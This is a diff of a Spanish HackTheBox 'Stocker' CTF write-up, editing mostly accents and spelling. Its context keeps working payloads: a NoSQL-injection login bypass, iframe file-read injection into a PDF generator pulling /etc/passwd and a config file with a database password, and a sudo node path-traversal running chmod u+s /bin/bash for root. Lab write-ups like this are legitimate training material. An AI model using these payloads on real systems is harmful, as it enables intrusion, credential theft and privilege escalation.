@@ -15,11 +15,11 @@ tags:
   - pentesting
   - Linux
 ---
-Buenas a todos, este es mi primer writeup, en esta ocación vamos a resolver una maquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.
+Buenas a todos, este es mi primer writeup, en esta ocasión vamos a resolver una máquina linux llamada stocker de HackTheBox lo cual es está catalogada como easy, espero que disfruten el contenido.
 
 ![](/assets/images/htb-writeup-stocker/Stocker.png)
 
-Empezamos a escanear para decubrir puertos abiertos en la maquina
+Empezamos a escanear para decubrir puertos abiertos en la máquina
 
 ```bash
 ❯ nmap -p- --min-rate 5000 -n -vvv -Pn 10.10.11.196
@@ -41,7 +41,7 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 63
 
 ```
-Luego seguimos con el escaneo de puertos para ver que versiones y servicios tiene
+Luego seguimos con el escaneo de puertos para ver quá versiones y servicios tiene
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.196
@@ -115,11 +115,11 @@ Progress: 9028 / 220561 (4.09%)^C
 2023/03/12 22:07:20 Finished
 ===============================================================
 ```
-Podemos ver que nos reporto un directorio llamado fonts, veamos con que nos encontramos
+Podemos ver que nos reportó un directorio llamado fonts, veamos con qué nos encontramos
 
 ![](/assets/images/htb-writeup-stocker/direc.png)
 
-vemos que no hay nada, intentemos buscar subdirectorios
+Vemos que no hay nada, intentemos buscar subdirectorios
 
 ```bash
 
@@ -149,7 +149,7 @@ Ingresemos a la web
 
 ![](/assets/images/htb-writeup-stocker/pag.png)
 
-Podemos ver que tenemos un login, intente bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, despues de muchos intento con 
+Podemos ver que tenemos un login, intenté bypasear el login comprobando si es vulnerable a los ataques sqli pero no tuve resultados, después de muchos intento con 
 BurpSuite me di cuenta que puedo cambiar las peticiones para causar ataques NoSqli
 
 Al interceptar por BurpSuite nos muestra esto
@@ -185,7 +185,7 @@ Upgrade-Insecure-Requests: 1
 username=admin&password=admin
 ```
  
-Ahora para hacer el ataque NoSqli tenemos que ejecutar donde esta el apartado username=admin.... con este script
+Ahora para hacer el ataque NoSqli tenemos que ejecutar donde está el apartado username=admin.... con este script
 
 ```bash
 {"username": {"$ne": null}, "password": {"$ne": null} }
@@ -196,7 +196,7 @@ Pero antes donde dice content-Type tenemos que poner esto
 ```bash
 application/json
 ```
-Y nos quedaria algo asi 
+Y nos quedaría algo así 
 
 ![](/assets/images/htb-writeup-stocker/burp.png)
 
@@ -238,17 +238,17 @@ En el apartado title podemos modificar  y pasarle una estructura que tenga un ar
 <iframe src=file:///etc/passwd height=750px width=750px></iframe>
 
 ```
-Miramos en el repeater que a la derecha luego de ejecutar el codigo nos muestra una id
+Miramos en el repeater que a la derecha luego de ejecutar el código nos muestra una id
 
 ![](/assets/images/htb-writeup-stocker/id.png)
 
-Copiamos ese id y lo pegamos donde esta el pdf para que nos muestre el /etc/passwd
+Copiamos ese id y lo pegamos donde está el pdf para que nos muestre el /etc/passwd
 
 ![](/assets/images/htb-writeup-stocker/pdf2.png)
 
-Si prestamos atencion al archivo podemos ver que hay un usuario que se llama angoose
+Si prestamos atención al archivo podemos ver que hay un usuario que se llama angoose
 
-Puedo pensas que al tener un subdominio llamado dev tengo entendido que /var/www/dev/index.js sea un archivo de configuración valido
+Puedo pensar que al tener un subdominio llamado dev tengo entendido que /var/www/dev/index.js sea un archivo de configuración válido
 
 Si ejecutamos este script, copiamos el id y lo pegamos donde está el pdf 
 
@@ -256,13 +256,13 @@ Si ejecutamos este script, copiamos el id y lo pegamos donde está el pdf
 "<iframe src=file:///var/www/dev/index.js height=800px width=800px></iframe>"
 
 ```
-Deberiamos ver el index.js en el pdf claramente
+Deberíamos ver el index.js en el pdf claramente
 
 ![](/assets/images/htb-writeup-stocker/burpsuite.png)
 
 ![](/assets/images/htb-writeup-stocker/id2.png)
 
-Donde marque, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos pobra esa contraseña para poder conectarnos 
+Donde marqué, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos probar esa contraseña para poder conectarnos 
 con ssh con el usuario angoose
 
 Nos conectamos por ssh
@@ -327,14 +327,14 @@ angoose@stocker:~$
 
 ```
 
-Ahora definimos un js para que nos haga una bash suid, cuando lo ejecutemos nos hara un directory path traversal
+Ahora definimos un js para que nos haga una bash suid, cuando lo ejecutemos nos hará un directory path traversal
 
 ## Codigo js
 
 ```
 require('child_process').exec('chmod u+s /bin/bash')
 ```
-Ahora ejecutamos el script de js y al hacer bash -p tendremos privilegio como root
+ Ejecutamos el script de js y al hacer bash -p tendremos privilegio como root
 
 ```bash
 angoose@stocker:~$ sudo node /usr/local/scripts/../../../home/angoose/setensa.js
